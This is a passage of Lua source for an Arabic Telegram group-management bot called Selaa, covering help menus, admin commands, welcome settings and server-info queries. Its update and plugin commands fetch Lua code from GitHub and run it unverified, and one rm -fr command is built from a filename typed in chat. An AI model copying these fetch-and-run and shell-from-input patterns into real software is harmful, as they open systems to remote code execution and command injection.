↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م4$") and Sudo(msg) or text and text:match("^تعيين امر م٤$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م4) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help41'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده" ,  1, "md")
Selaa:del(Selaa..'Selaa:Help41'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help4', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٤$") or text and text:match("^م4$") or text and text:match("^اوامر4$") or text and text:match("^اوامر٤$") then
local Help = Selaa:get(Selaa..'Selaa:Help4')
local text =  [[
↯☆اوامر المنشئين ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تنزيل الكل
↯☆الميديا • امسح
↯☆اضف • حذف ⇇ امر
↯☆حذف الاوامر المضافه
↯☆الاوامر المضافه
↯☆اضف نقاط ⇇ بالرد • بالايدي
↯☆اضف رسائل ⇇ بالرد • بالايدي
↯☆رفع منظف • تنزيل منظف
↯☆المنظفين • حذف المنظفين
↯☆رفع مدير • تنزيل مدير
↯☆المدراء • حذف المدراء
↯☆تفعيل • تعطيل + الامر ⇇ ⤈
↯☆نزلني • امسح
↯☆الحظر • الكتم
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆اوامر المنشئين الاساسيين ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆وضع لقب + اللقب
↯☆تفعيل • تعطيل ⇇ الرفع
↯☆رفع منشئ • تنزيل منشئ
↯☆المنشئين • حذف المنشئين
↯☆رفع • تنزيل ⇇ مشرف
↯☆رفع بكل الصلاحيات
↯☆حذف القوائم
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆اوامر منشئ المجموعه ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆رفع • تنزيل ⇇ منشئ اساسي
↯☆حذف المنشئين الاساسيين 
↯☆المنشئين الاساسيين 
↯☆حذف جميع الرتب
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م5$") and Sudo(msg) or text and text:match("^تعيين امر م٥$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م5) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help51'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده " ,  1, "md")
Selaa:del(Selaa..'Selaa:Help51'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help5', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٥$") or text and text:match("^م5$") or text and text:match("^اوامر5$") or text and text:match("^اوامر٥$") then
if not SudoBot(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆هذا الامر للمطورين فقط ', 1, 'md')
else
local Help = Selaa:get(Selaa..'Selaa:Help5')
local text =  [[
↯☆اوامر المطورين ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆الجروبات
↯☆المطورين
↯☆المشتركين
↯☆الاحصائيات
↯☆المجموعات
↯☆اسم البوت + غادر
↯☆اسم البوت + تعطيل
↯☆كشف + -ايدي المجموعه
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆رفع • تنزيل ⇇ مدير عام
↯☆حذف • المدراء العامين 
↯☆رفع • تنزيل ⇇ ادمن عام
↯☆حذف • الادمنيه العامين 
↯☆رفع • تنزيل ⇇ مميز عام
↯☆حذف • المميزين عام 
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆اوامر المطور الاساسي ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تحديث
↯☆الملفات
↯☆المتجر
↯☆السيرفر
↯☆روابط الجروبات
↯☆تحديث السورس
↯☆تنظيف الجروبات
↯☆تنظيف المشتركين
↯☆حذف جميع الملفات
↯☆تعيين الايدي العام
↯☆حذف معلومات الترحيب
↯☆تغير معلومات الترحيب
↯☆غادر + -ايدي المجموعه
↯☆تعيين عدد الاعضاء + العدد
↯☆حظر عام • الغاء العام
↯☆كتم عام • الغاء العام
↯☆قائمه العام • حذف قائمه العام
↯☆وضع • حذف ⇇ اسم البوت
↯☆اضف • حذف ⇇ رد عام
↯☆ردود المطور • حذف ردود المطور
↯☆تعيين • حذف • جلب ⇇ رد الخاص
↯☆جلب نسخه الجروبات
↯☆رفع النسخه + بالرد على الملف
↯☆تعيين • حذف ⇇ قناة الاشتراك
↯☆جلب كليشه الاشتراك
↯☆تغيير • حذف ⇇ كليشه الاشتراك
↯☆رفع • تنزيل ⇇ مطور
↯☆المطورين • حذف المطورين
↯☆تعيين • حذف ⇇ كليشة الايدي
↯☆اذاعه للكل بالتوجيه ⇇ بالرد
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تفعيل ملف + اسم الملف
↯☆تعطيل ملف + اسم الملف
↯☆تفعيل • تعطيل + الامر ⇇ ⤈
↯☆الاذاعه • الاشتراك الاجباري
↯☆ترحيب البوت • المغادره
↯☆البوت الخدمي • التواصل
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text and text:match("^تعيين امر م6$") and Sudo(msg) or text and text:match("^تعيين امر م٦$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م6) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help61'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده" ,  1, "md")
Selaa:del(Selaa..'Selaa:Help61'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help6', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
end
if text and text:match("^م٦$") or text and text:match("^م6$") or text and text:match("^اوامر6$") or text and text:match("^اوامر٦$") then
local Help = Selaa:get(Selaa..'Selaa:Help6')
local text =  [[
↯☆اوامر الاعضاء ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆السورس • موقعي • رتبتي • معلوماتي
↯☆رسائلي • حذف رسائلي • اسمي • معرفي 
↯☆ايدي •ايديي • جهاتي • المطايه • الالعاب 
↯☆نقاطي • بيع نقاطي • القوانين • زخرفه 
↯☆رابط الحذف • نزلني • اطردني • المطور 
↯☆منو ضافني • مشاهدات المنشور • الرابط 
↯☆نسبه الحب • نسبه الانوثه • نسبه الرجوله
↯☆ايدي المجموعه • معلومات المجموعه 
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆كول + الكلمه
↯☆زخرفه + اسمك
↯☆برج + نوع البرج
↯☆معنى اسم + الاسم
↯☆احسب + تاريخ ميلادك
↯☆رفع مطي • تنزيل مطي
↯☆بوسه • بوسها ⇇ بالرد
↯☆هينه • هينها ⇇ بالرد • بالمعرف
↯☆صيحه • صيحها ⇇ بالرد • بالمعرف
↯☆ايدي • كشف  ⇇ بالرد • بالمعرف • بالايدي
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
--     Source Selaa     --
if Sudo(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆جاري تحديث سورس سيلاسيلا', 1, 'md') 
os.execute('rm -rf Selaa.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0abs/Selaa/master/Selaa.lua') 
dofile('Selaa.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '⇇ تحديث ⌁' then  
dofile('Selaa.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تحديث ملفات البوت", 1, "md")
end 
if text == 'نقل الاحصائيات' then
local Users = Selaa:smembers(Selaa.."bot:userss")
local Groups = Selaa:smembers(Selaa..'bot:groups')
local Sudos = Selaa:smembers(Selaa.."abs:SudoBot:")
if Selaa:get('Selaa_PROX:'..Selaa..'name_bot') then
Selaa:set(Selaa..'Selaa:NameBot',(Selaa:get('Selaa_PROX:'..Selaa..'name_bot') or 'سيلا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
Selaa:sadd(Selaa..'Selaa:Users',Users[i]) 
end
end
for i = 1, #Sudos do
Selaa:sadd(Selaa..'Selaa:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
Selaa:sadd(Selaa..'Selaa:Groups',Groups[i]) 
if Selaa:get(Selaa.."bot:group:link"..Groups[i]) then
Selaa:set(Selaa.."Selaa:Groups:Links"..Groups[i],Selaa:get(Selaa.."bot:group:link"..Groups[i]))
end
if Selaa:get(Selaa.."welcome:"..Groups[i]) then
Selaa:set(Selaa..'Selaa:Groups:Welcomes'..Groups[i],Selaa:get(Selaa.."welcome:"..Groups[i]))
end
local list1 = Selaa:smembers(Selaa..'abs:absmonsh:'..Groups[i])
for k,v in pairs(list1) do
Selaa:sadd(Selaa.."Selaa:SelaaConstructor:"..Groups[i], v)
end
local list2 = Selaa:smembers(Selaa..'abs:monsh:'..Groups[i])
for k,v in pairs(list2) do
Selaa:sadd(Selaa.."Selaa:Constructor:"..Groups[i], v)
end
local list3 = Selaa:smembers(Selaa..'abs:monshid:'..Groups[i])
for k,v in pairs(list3) do
Selaa:sadd(Selaa.."Selaa:BasicConstructor:"..Groups[i], v)
end
local list4 = Selaa:smembers(Selaa..'abs:owners:'..Groups[i])
for k,v in pairs(list4) do
Selaa:sadd(Selaa.."Selaa:Managers:"..Groups[i], v)
end
local list5 = Selaa:smembers(Selaa..'abs:admins:'..Groups[i])
for k,v in pairs(list5) do
Selaa:sadd(Selaa.."Selaa:Admins:"..Groups[i], v)
end
local list6 = Selaa:smembers(Selaa..'abs:vipmem:'..Groups[i])
for k,v in pairs(list6) do
Selaa:sadd(Selaa.."Selaa:VipMem:"..Groups[i], v)
end
local list7 = Selaa:smembers(Selaa..'abs:Cleaner:'..Groups[i])
for k,v in pairs(list7) do
Selaa:sadd(Selaa.."Selaa:Cleaner:"..Groups[i], v)
end
Selaa:set(Selaa.."Selaa:Lock:Bots"..Groups[i],"del") Selaa:hset(Selaa.."Selaa:Spam:Group:User"..Groups[i] ,"Spam:User","del") 
LockList ={'Selaa:Lock:Links','Selaa:Lock:Forwards','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:EditMsgs','Selaa:Lock:Stickers','Selaa:Lock:Farsi','Selaa:Lock:Spam','Selaa:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
Selaa:set(Selaa..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'↯☆تم نقل ⇇ '..#Groups..' مجموعه\n↯☆تم نقل ⇇ '..#Users..' مشترك\n↯☆من التحديث القديم الى التحديث الجديد')
Selaa:del('Selaa_PROX:') Selaa:del(Selaa..'bot:') Selaa:del(Selaa..'Selaa_PROX:')
Selaa:del(Selaa..'user:msgs'..msg.chat_id_) Selaa:del(Selaa..'abs:')
end
if text == 'تصحيح الاخطاء' then
if not Selaa:get(Selaa..'Selaa:Error') then
local ErrorGroups = Selaa:smembers(Selaa..'Selaa:Groups')
for i = 1, #ErrorGroups do
local ErrorList1 = Selaa:smembers(Selaa..'Selaa:Constructor:'..ErrorGroups[i])
for k,v in pairs(ErrorList1) do
Selaa:sadd(Selaa.."Selaa:BasicConstructorError:"..ErrorGroups[i], v)
end
local ErrorList2 = Selaa:smembers(Selaa..'Selaa:BasicConstructor:'..ErrorGroups[i])
for k,v in pairs(ErrorList2) do
Selaa:sadd(Selaa.."Selaa:ConstructorError:"..ErrorGroups[i], v)
end
Selaa:del(Selaa.."Selaa:Constructor:"..ErrorGroups[i]) Selaa:del(Selaa.."Selaa:BasicConstructor:"..ErrorGroups[i])
local ErrorList22 = Selaa:smembers(Selaa..'Selaa:BasicConstructorError:'..ErrorGroups[i])
for k,v in pairs(ErrorList22) do
Selaa:sadd(Selaa.."Selaa:BasicConstructor:"..ErrorGroups[i], v)
end
local ErrorList11 = Selaa:smembers(Selaa..'Selaa:ConstructorError:'..ErrorGroups[i])
for k,v in pairs(ErrorList11) do
Selaa:sadd(Selaa.."Selaa:Constructor:"..ErrorGroups[i], v)
end
Selaa:del(Selaa.."Selaa:ConstructorError:"..ErrorGroups[i]) Selaa:del(Selaa.."Selaa:BasicConstructorError:"..ErrorGroups[i])
end
io.popen("mkdir Files")
Selaa:set(Selaa..'Selaa:Error',true)
send(msg.chat_id_, msg.id_,'↯☆تم تصحيح اخطاء التحديث القديم')
else
send(msg.chat_id_, msg.id_,'↯☆لديك اخر نسخه من التحديث لاتوجد اخطاء')
end
end
--     Source Selaa     --
if text == 'الملفات' then
Files = '\n↯☆الملفات المفعله في البوت ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '↯☆لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/iq0abs/SelaaFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n↯☆قائمة ملفات متجر سورس Selaa\n↯☆الملفات المتوفره حاليا ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
local TextE = "┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆علامة ⇇ (✔) تعني الملف مفعل\n↯☆علامة ⇇ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CeckFile = "(✔)"
else
CeckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."↯☆"..Info..' ⇇ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CeckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"↯☆لا يوجد اتصال من الـapi") 
end
end
if text == "مسح جميع الملفات" or text == "حذف جميع الملفات" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"↯☆تم حذف جميع الملفات المفعله")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/iq0abs/SelaaFiles/master/SelaaFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\n↯☆الملف ⇇ *"..FileName.."*\n↯☆تم تعطيله وحذفه من البوت بنجاح") 
dofile('Selaa.lua')  
else
send(msg.chat_id_, msg.id_,"↯☆لا يوجد ملف بهذا الاسم") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/iq0abs/SelaaFiles/master/SelaaFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n↯☆الملف ⇇ *"..FileName.."*\n↯☆تم تفعيله في البوت بنجاح") 
dofile('Selaa.lua')  
else
send(msg.chat_id_, msg.id_,"↯☆لا يوجد ملف بهذا الاسم") 
end
return false
end
end 
--     Source Selaa     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and Sudo(msg) then    
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف معلومات الترحيب', 1, 'md')   
Selaa:del(Selaa..'Selaa:Text:BotWelcome')
Selaa:del(Selaa..'Selaa:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and Sudo(msg) then    
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
Selaa:del(Selaa..'Selaa:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and Sudo(msg) then    
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
Selaa:set(Selaa..'Selaa:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '⇇ تغير معلومات الترحيب ⌁') and Sudo(msg) then    
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي نص الترحيب', 1, 'md') 
Selaa:del(Selaa..'Selaa:Text:BotWelcome')
Selaa:del(Selaa..'Selaa:Photo:BotWelcome')
Selaa:set(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and Selaa:get(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء الامر", 1, "md") 
Selaa:del(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ النص ارسل لي صورة الترحيب\n↯☆ارسل ⇇ الغاء لحفظ النص فقط", 1, 'md')   
Selaa:set(Selaa.."Selaa:Text:BotWelcome",text) 
Selaa:set(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if Selaa:get(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
Selaa:del(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
Selaa:set(Selaa.."Selaa:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ النص وصورة الترحيب", 1, 'md')   
Selaa:del(Selaa.."Selaa:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source Selaa     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة المطور الان ", 1, "md")
Selaa:setex(Selaa.."Selaa:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف كليشة المطور", 1, "md")
Selaa:del(Selaa.."DevText")
end end
--     Source Selaa     --
if Selaa:get(Selaa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء الامر", 1, "md") 
Selaa:del(Selaa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Selaa:del(Selaa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
Selaa:set(Selaa..'Selaa:textch:user',texxt)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغير كليشه الاشتراك$") and Sudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
Selaa:setex(Selaa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
local text = '↯☆حسنا ارسل كليشة الاشتراك الجديده'  
Selaa(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa:del(Selaa..'Selaa:textch:user')
textt = "↯☆تم حذف كليشة الاشتراك الاجباري"
Selaa(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
local chtext = Selaa:get(Selaa.."Selaa:textch:user")
if chtext then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆كليشة الاشتراك ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
local Selaa6 = Selaa:get(Selaa.."Selaa3")
if Selaa6 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عليك الاشتراك في قناة البوت \n↯☆قناة البوت ⇇ '..Selaa6, 1, "html")
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لم يتم تعيين قناة الاشتراك الاجباري \n↯☆ارسل ⇇ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source Selaa     --
if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆Channel ↬ @sourcesela', 1, 'html')    
end 
--     Source Selaa     --
if Sudo(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
Selaa(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '↯☆نظام التشغيل ⇇ ⤈\n`'"$linux_version"'`' 
echo '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الذاكره العشوائيه ⇇ ⤈\n`'"$memUsedPrc"'`'
echo '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆وحدة التخزين ⇇ ⤈\n`'"$HardDisk"'`'
echo '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆المعالج ⇇ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الدخول ⇇ ⤈\n`'`whoami`'`'
echo '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆مدة تشغيل السيرفر ⇇ ⤈\n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source Selaa     --
SelaaFiles(msg)
--     Source Selaa     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
Selaa:incr(Selaa..'Selaa:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(msg) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local absname = '↯☆العضو ⇇ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
local absid = '↯☆ايديه ⇇ `'..dp.id_..'`'
local abstext = '↯☆قام بالتعديل على الميديا'
local function cb(extra,result,success)
local admins = result.members_  
text = '\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
text = text.."~ [@"..data.username_.."]\n"
if #admins == i then 
SendText(msg.chat_id_, absname..'\n'..absid..'\n'..abstext..text,0,'md') 
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200,cb)
end,nil)
end
if not VipMem(msg) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     Source Selaa     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = Selaa:get(Selaa..'Selaa:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;Selaa:del(Selaa..'Selaa:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Selaa:del(Selaa..'Selaa:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
